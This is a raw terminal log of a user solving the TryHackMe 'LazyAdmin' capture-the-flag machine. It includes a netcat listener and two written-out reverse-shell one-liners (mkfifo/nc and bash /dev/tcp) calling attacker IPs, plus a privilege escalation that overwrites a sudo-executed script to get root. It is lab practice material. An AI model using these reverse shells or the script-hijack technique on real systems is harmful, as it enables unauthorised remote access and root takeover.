@@ -1,0 +1,276 @@
+Script started on 2021-04-03 15:31:22+05:30 [TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="203" LINES="53"]
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_lazyAdmin[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_lazyAdmin[00m$ cp ~/Documents/linpeas.sh .
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_lazyAdmin[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_lazyAdmin[00m$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.194.184 - - [03/Apr/2021 15:32:20] "GET /linpeas.sh HTTP/1.1" 200 -
+----------------------------------------
+Exception happened during processing of request from ('10.10.194.184', 45118)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/http/server.py", line 647, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/lib/python3.8/http/server.py", line 427, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.8/http/server.py", line 415, in handle_one_request
+    method()
+  File "/usr/lib/python3.8/http/server.py", line 654, in do_GET
+    self.copyfile(f, self.wfile)
+  File "/usr/lib/python3.8/http/server.py", line 853, in copyfile
+    shutil.copyfileobj(source, outputfile)
+  File "/usr/lib/python3.8/shutil.py", line 205, in copyfileobj
+    fdst_write(buf)
+  File "/usr/lib/python3.8/socketserver.py", line 799, in write
+    self._sock.sendall(b)
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+10.10.194.184 - - [03/Apr/2021 15:32:40] "GET /linpeas.sh HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_lazyAdmin[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_lazyAdmin[00m$ c[Knc -lvnp 9999
+Listening on 0.0.0.0 9999
+Connection received on 10.10.194.184 47532
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
+ 13:41:12 up  2:49,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@THM-Chal:/$ ^Z
+[1]+  Stopped                 nc -lvnp 9999
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_lazyAdmin[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_lazyAdmin[00m$ stty raw -echo
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_lazyAdmin[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_lazyAdmin[00m$ nc -lvnp 9999
+reset
+reset: unknown terminal type unknown
+Terminal type? xterm-256color
+[3g        H        H        H        H        H        H        H        H        Hc[!p[?3;4l[4l>www-data@THM-Chal:/$ ls
+bin    dev   initrd.img      lost+found  opt   run   srv  usr	   vmlinuz.old
+boot   etc   initrd.img.old  media	 proc  sbin  sys  var
+cdrom  home  lib	     mnt	 root  snap  tmp  vmlinuz
+www-data@THM-Chal:/$ cd /tmp
+www-data@THM-Chal:/tmp$ touch asd
+www-data@THM-Chal:/tmp$ excho    cho "njifnijf" > asd
+www-data@THM-Chal:/tmp$ cat asd
+njifnijf
+www-data@THM-Chal:/tmp$ nano asd
+Unable to create directory /var/www/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+Error opening terminal: unknown.
+www-data@THM-Chal:/tmp$ reset
+reset: unknown terminal type unknown
+Terminal type? xterm
+[3g        H        H        H        H        H        H        H        H        Hc[!p[?3;4l[4l>www-data@THM-Chal:/tmp$ nano asd
+Unable to create directory /var/www/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+Error opening terminal: unknown.
+www-data@THM-Chal:/tmp$ rete  set
+reset: unknown terminal type unknown
+Terminal type? xterm-256color
+[3g        H        H        H        H        H        H        H        H        Hc[!p[?3;4l[4l>www-data@THM-Chal:/tmp$ nano asd
+Unable to create directory /var/www/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+Error opening terminal: unknown.
+www-data@THM-Chal:/tmp$ reset
+reset: unknown terminal type unknown
+Terminal type? zsh
+reset: unknown terminal type zsh
+Terminal type? ^C
+www-data@THM-Chal:/tmp$ resetnano asd
+Unable to create directory /var/www/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+Error opening terminal: unknown.
+www-data@THM-Chal:/tmp$ echo $TERM
+dumb
+www-data@THM-Chal:/tmp$ export TERM=linux     linux
+www-data@THM-Chal:/tmp$ export TERM=linux[7Pcho $TERM
+linux
+www-data@THM-Chal:/tmp$ nano asf d
+Unable to create directory /var/www/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+[1;24r[0;10m[4l[?7h[39;49m[?25l[?1c[39;49m[0;10m[H[J[22;33H[0;10;7m[ Reading File ][3d[0;10m[22;39H[0;10;7m 1 line ][0;10m[K[4d[?25h[?0c[H[39;49m[0;10;7m  GNU nano 2.5.3                File: asd                                       [3;1H[0;10mnjifnijf[23d[0;10;7m^G[0;10m Get Help  [0;10;7m^O[0;10m Write Out [0;10;7m^W[0;10m Where Is  [0;10;7m^K[0;10m Cut Text  [0;10;7m^J[0;10m Justify   [0;10;7m^C[0;10m Cur Pos[24d[0;10;7m^X[0;10m Exit[14G[0;10;7m^R[0;10m Read File [0;10;7m^\[0;10m Replace   [0;10;7m^U[0;10m Uncut Text[0;10;7m^T[0;10m To Spell  [0;10;7m^_[0;10m Go To Line[3d[22d[J[24;80H[24;1Hwww-data@THM-Chal:/tmp$ 
+www-data@THM-Chal:/tmp$ 
+www-data@THM-Chal:/tmp$ clear
+[H[Jwww-data@THM-Chal:/tmp$ cd /home/itguy/
+www-data@THM-Chal:/home/itguy$ cat   ls
+Desktop    Downloads  Pictures	Templates  backup.pl	     mysql_login.txt
+Documents  Music      Public	Videos	   examples.desktop  user.txt
+www-data@THM-Chal:/home/itguy$ cat backup.pl 
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+www-data@THM-Chal:/home/itguy$ nano /etc/copy.sh 
+Unable to create directory /var/www/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+[1;24r[0;10m[4l[?7h[39;49m[?25l[?1c[39;49m[0;10m[H[J[22;9H[0;10;7m[ Error writing lock file /etc/.copy.sh.swp: Permission denied ][3d[0;10m[22;32H[1K [0;10;7m[ Reading File ][0;10m[K[3d[22;39H[0;10;7m 1 line ][0;10m[K[4d[?25h[?0c[H[39;49m[0;10;7m  GNU nano 2.5.3             File: /etc/copy.sh                                 [3;1H[0;10;1m[34mrm[39m[0;10m /tmp/f[32m;[39m[0;10mmkfifo /tmp/f[32m;[0;10;1m[34mcat[39m[0;10m /tmp/f[32m|[39m[0;10m/bin/sh -i 2[32m>&[39m[0;10m1[32m|[39m[0;10mnc 192.168.0.190 5554 [32m>[39m[0;10m/tmp/f[23;1H[0;10;7m^G[0;10m Get Help  [0;10;7m^O[0;10m Write Out [0;10;7m^W[0;10m Where Is  [0;10;7m^K[0;10m Cut Text  [0;10;7m^J[0;10m Justify   [0;10;7m^C[0;10m Cur Pos[24d[0;10;7m^X[0;10m Exit[14G[0;10;7m^R[0;10m Read File [0;10;7m^\[0;10m Replace   [0;10;7m^U[0;10m Uncut Text[0;10;7m^T[0;10m To Linter [0;10;7m^_[0;10m Go To Line[3d[?25l[?1c[1;71H[0;10;7mModified[22;2H[ Warning: Modifying a file which is not locked, check directory permission? ][3d[0;10m[?25h[?0c[36m#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp[39m[0;10m$[3;2H[C[C[3;12H[19G[26G[22d[K[3;32H[39G[46G[52G[59G[66G[72G[79G[4d[5dbash -c [0;10;1m[33m'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'[39m[0;10m[5;42H[1P[1P[1P[1P[1P[1P[0;10;1m[33m10.9.3.85/$RPORT <&1'[5;43H[39m[0;10m[6d[5;55H[0;10;1m[33m <&1'[39m[0;10m[K[49G[0;10;1m[33m <&1'[39m[0;10m[K[48G[0;10;1m[33m <&1'[39m[0;10m[K[47G[0;10;1m[33m <&1'[39m[0;10m[K[46G[0;10;1m[33m <&1'[39m[0;10m[K[45G[0;10;1m[33m <&1'[39m[0;10m[K[44G[0;10;1m[33m7 <&1'[45G[39m[0;10m[0;10;1m[33m77 <&1'[46G[39m[0;10m[0;10;1m[33m777 <&1'[47G[39m[0;10m[0;10;1m[33m7777 <&1'[48G[39m[0;10m[22d[0;10;7mFile Name to Write: /etc/copy.sh                                                [23;14H[0;10m   [0;10;7mM-D[0;10m DOS Format  [0;10;7mM-A[0;10m Append      [0;10;7mM-B[0;10m Backup File[K[24;2H[0;10;7mC[0;10m Cancel       [0;10;7mM-M[0;10m Mac Format  [0;10;7mM-P[0;10m Prepend     [0;10;7m^T[0;10m To Files[K[22;33H[?25l[?1c[39;49m[0;10m[1K [0;10;7m[ Wrote 3 lines ][0;10m[K[5;48H[?25h[?0c[1;71H[0;10;7m        [23;14H^O[0;10m Write Out [0;10;7m^W[0;10m Where Is  [0;10;7m^K[0;10m Cut Text  [0;10;7m^J[0;10m Justify   [0;10;7m^C[0;10m Cur Pos[24;2H[0;10;7mX[0;10m Exit      [0;10;7m^R[0;10m Read File [0;10;7m^\[0;10m Replace   [0;10;7m^U[0;10m Uncut Text[0;10;7m^T[0;10m To Linter [0;10;7m^_[0;10m Go To Line[5;48H[22d[J[24;80H[24;1Hwww-data@THM-Chal:/home/itguy$ sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
+^C^C^C
+
+www-data@THM-Chal:/home/itguy$ 
+www-data@THM-Chal:/home/itguy$ 
+www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl-l[Knano /etc/copy.sh 
+Unable to create directory /var/www/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+[1;24r[0;10m[4l[?7h[39;49m[?25l[?1c[39;49m[0;10m[H[J[22;9H[0;10;7m[ Error writing lock file /etc/.copy.sh.swp: Permission denied ][3d[0;10m[22;32H[1K [0;10;7m[ Reading File ][0;10m[K[3d[22;39H[0;10;7m 3 lines[6d[0;10m[?25h[?0c[H[39;49m[0;10;7m  GNU nano 2.5.3             File: /etc/copy.sh                                 [3;1H[0;10m[36m#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp[39m[0;10m$[5;1Hbash -c [0;10;1m[33m'exec bash -i &>/dev/tcp/10.9.3.85/7777 <&1'[23d[39m[0;10;7m^G[0;10m Get Help  [0;10;7m^O[0;10m Write Out [0;10;7m^W[0;10m Where Is  [0;10;7m^K[0;10m Cut Text  [0;10;7m^J[0;10m Justify   [0;10;7m^C[0;10m Cur Pos[24d[0;10;7m^X[0;10m Exit[14G[0;10;7m^R[0;10m Read File [0;10;7m^\[0;10m Replace   [0;10;7m^U[0;10m Uncut Text[0;10;7m^T[0;10m To Linter [0;10;7m^_[0;10m Go To Line[3d[4d[5dba[9G[16G[23G[22d[K[5;30H[36G[43G[50G[6d[5;53H[?25l[?1c[1;71H[0;10;7mModified[22;2H[ Warning: Modifying a file which is not locked, check directory permission? ][5;52H[0;10m[?25h[?0c[5;9H'[32mexec[39m[0;10m bash -i [32m&>[39m[0;10m/dev/tcp/10.9.3.85/7777 [32m<&[39m[0;10m1[K [44G[K[37G[K[30G[K[5;22H[42m [49m[0;10m[K[22d[K[5;23H[17G[K[10Gexe[K   [42m [49m[0;10m[K  [42m [49m[0;10m[K  h[22d[0;10;7mFile Name to Write: /etc/copy.sh                                                [23;14H[0;10m   [0;10;7mM-D[0;10m DOS Format  [0;10;7mM-A[0;10m Append      [0;10;7mM-B[0;10m Backup File[K[24;2H[0;10;7mC[0;10m Cancel       [0;10;7mM-M[0;10m Mac Format  [0;10;7mM-P[0;10m Prepend     [0;10;7m^T[0;10m To Files[K[22;33H[?25l[?1c[39;49m[0;10m[1K [0;10;7m[ Wrote 3 lines ][0;10m[K[5;5H[?25h[?0c[1;71H[0;10;7m        [23;14H^O[0;10m Write Out [0;10;7m^W[0;10m Where Is  [0;10;7m^K[0;10m Cut Text  [0;10;7m^J[0;10m Justify   [0;10;7m^C[0;10m Cur Pos[24;2H[0;10;7mX[0;10m Exit      [0;10;7m^R[0;10m Read File [0;10;7m^\[0;10m Replace   [0;10;7m^U[0;10m Uncut Text[0;10;7m^T[0;10m To Linter [0;10;7m^_[0;10m Go To Line[5;5H[22d[J[24;80H[24;1Hwww-data@THM-Chal:/home/itguy$ nano /etc/copy.sh sudo /usr/bin/perl /home/itguy/backup.pl
+root@THM-Chal:/home/itguy# sudo -l
+Matching Defaults entries for root on THM-Chal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User root may run the following commands on THM-Chal:
+    (ALL : ALL) ALL
+root@THM-Chal:/home/itguy# cat bak ckup.pl 
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+root@THM-Chal:/home/itguy# ls -la
+total 148
+drwxr-xr-x 18 itguy itguy 4096 nov 30  2019 [0m[01;34m.[0m
+drwxr-xr-x  3 root  root  4096 nov 29  2019 [01;34m..[0m
+-rw-------  1 itguy itguy 1630 nov 30  2019 .ICEauthority
+-rw-------  1 itguy itguy   53 nov 30  2019 .Xauthority
+lrwxrwxrwx  1 root  root     9 nov 29  2019 [01;36m.bash_history[0m -> [40;33;01m/dev/null[0m
+-rw-r--r--  1 itguy itguy  220 nov 29  2019 .bash_logout
+-rw-r--r--  1 itguy itguy 3771 nov 29  2019 .bashrc
+drwx------ 13 itguy itguy 4096 nov 29  2019 [01;34m.cache[0m
+drwx------ 14 itguy itguy 4096 nov 29  2019 [01;34m.config[0m
+drwx------  3 itguy itguy 4096 nov 29  2019 [01;34m.dbus[0m
+-rw-r--r--  1 itguy itguy   25 nov 29  2019 .dmrc
+drwx------  2 itguy itguy 4096 nov 29  2019 [01;34m.gconf[0m
+drwx------  3 itguy itguy 4096 nov 30  2019 [01;34m.gnupg[0m
+drwx------  3 itguy itguy 4096 nov 29  2019 [01;34m.local[0m
+drwx------  5 itguy itguy 4096 nov 29  2019 [01;34m.mozilla[0m
+-rw-------  1 itguy itguy  149 nov 29  2019 .mysql_history
+drwxrwxr-x  2 itguy itguy 4096 nov 29  2019 [01;34m.nano[0m
+-rw-r--r--  1 itguy itguy  655 nov 29  2019 .profile
+-rw-r--r--  1 itguy itguy    0 nov 29  2019 .sudo_as_admin_successful
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-clipboard.pid
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-display.pid
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-draganddrop.pid
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-seamless.pid
+-rw-------  1 itguy itguy   82 nov 30  2019 .xsession-errors
+-rw-------  1 itguy itguy   82 nov 29  2019 .xsession-errors.old
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mDesktop[0m
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mDocuments[0m
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mDownloads[0m
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mMusic[0m
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mPictures[0m
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mPublic[0m
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mTemplates[0m
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mVideos[0m
+-rw-r--r-x  1 root  root    47 nov 29  2019 [01;32mbackup.pl[0m
+-rw-r--r--  1 itguy itguy 8980 nov 29  2019 examples.desktop
+-rw-rw-r--  1 itguy itguy   16 nov 29  2019 mysql_login.txt
+-rw-rw-r--  1 itguy itguy   38 nov 29  2019 user.txt
+root@THM-Chal:/home/itguy# chown       ls -la /etc/copy.sh 
+-rw-r--rwx 1 root root 88 apr  3 13:55 [0m[01;32m/etc/copy.sh[0m
+root@THM-Chal:/home/itguy# chown /etc/copy.sh itguy:itguy
+chown: invalid user: '/etc/copy.sh'
+root@THM-Chal:/home/itguy# su itguy
+itguy@THM-Chal:~$ su root
+Password: 
+su: Authentication failure
+itguy@THM-Chal:~$ exit
+exit
+root@THM-Chal:/home/itguy# su itguy[22@chown /etc/copy.sh itguy:itguy
+chown: invalid user: '/etc/copy.sh'
+root@THM-Chal:/home/itguy# chown itguy:itguy /etc/copy.sh 
+root@THM-Chal:/home/itguy# chown itguy:itguy /etc/copy.sh [1P/etc/copy.sh itguy:itguyroot@THM-Chal:/home/itguy# su itguy[K[22@chown /etc/copy.sh itguy:itguyroot@THM-Chal:/home/itguy# [10Pls -la /etc/copy.sh 
+-rw-r--rwx 1 itguy itguy 88 apr  3 13:55 [0m[01;32m/etc/copy.sh[0m
+root@THM-Chal:/home/itguy# exit
+exit
+www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
+root@THM-Chal:/home/itguy# whi oami
+root
+root@THM-Chal:/home/itguy# exit
+exit
+www-data@THM-Chal:/home/itguy$ ext it    sudo /usr/bin/perl /home/itguy/backup.pl
+root@THM-Chal:/home/itguy# chown itgy uy:itguy backup.pl 
+root@THM-Chal:/home/itguy# ls -la
+total 148
+drwxr-xr-x 18 itguy itguy 4096 nov 30  2019 [0m[01;34m.[0m
+drwxr-xr-x  3 root  root  4096 nov 29  2019 [01;34m..[0m
+-rw-------  1 itguy itguy 1630 nov 30  2019 .ICEauthority
+-rw-------  1 itguy itguy   53 nov 30  2019 .Xauthority
+lrwxrwxrwx  1 root  root     9 nov 29  2019 [01;36m.bash_history[0m -> [40;33;01m/dev/null[0m
+-rw-r--r--  1 itguy itguy  220 nov 29  2019 .bash_logout
+-rw-r--r--  1 itguy itguy 3771 nov 29  2019 .bashrc
+drwx------ 13 itguy itguy 4096 nov 29  2019 [01;34m.cache[0m
+drwx------ 14 itguy itguy 4096 nov 29  2019 [01;34m.config[0m
+drwx------  3 itguy itguy 4096 nov 29  2019 [01;34m.dbus[0m
+-rw-r--r--  1 itguy itguy   25 nov 29  2019 .dmrc
+drwx------  2 itguy itguy 4096 nov 29  2019 [01;34m.gconf[0m
+drwx------  3 itguy itguy 4096 nov 30  2019 [01;34m.gnupg[0m
+drwx------  3 itguy itguy 4096 nov 29  2019 [01;34m.local[0m
+drwx------  5 itguy itguy 4096 nov 29  2019 [01;34m.mozilla[0m
+-rw-------  1 itguy itguy  149 nov 29  2019 .mysql_history
+drwxrwxr-x  2 itguy itguy 4096 nov 29  2019 [01;34m.nano[0m
+-rw-r--r--  1 itguy itguy  655 nov 29  2019 .profile
+-rw-r--r--  1 itguy itguy    0 nov 29  2019 .sudo_as_admin_successful
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-clipboard.pid
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-display.pid
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-draganddrop.pid
+-rw-r-----  1 itguy itguy    5 nov 30  2019 .vboxclient-seamless.pid
+-rw-------  1 itguy itguy   82 nov 30  2019 .xsession-errors
+-rw-------  1 itguy itguy   82 nov 29  2019 .xsession-errors.old
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mDesktop[0m
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mDocuments[0m
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mDownloads[0m
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mMusic[0m
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mPictures[0m
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mPublic[0m
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mTemplates[0m
+drwxr-xr-x  2 itguy itguy 4096 nov 29  2019 [01;34mVideos[0m
+-rw-r--r-x  1 itguy itguy   47 nov 29  2019 [01;32mbackup.pl[0m
+-rw-r--r--  1 itguy itguy 8980 nov 29  2019 examples.desktop
+-rw-rw-r--  1 itguy itguy   16 nov 29  2019 mysql_login.txt
+-rw-rw-r--  1 itguy itguy   38 nov 29  2019 user.txt
+root@THM-Chal:/home/itguy# exit
+exit
+www-data@THM-Chal:/home/itguy$ sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+www-data@THM-Chal:/home/itguy$ sudo -l[33@/usr/bin/perl /home/itguy/backup.pl
+root@THM-Chal:/home/itguy# exit
+exit
+www-data@THM-Chal:/home/itguy$ exit
+exit
+$ ]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_lazyAdmin[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_lazyAdmin[00m$ exit
+
+Script done on 2021-04-03 16:32:29+05:30 [COMMAND_EXIT_CODE="0"]
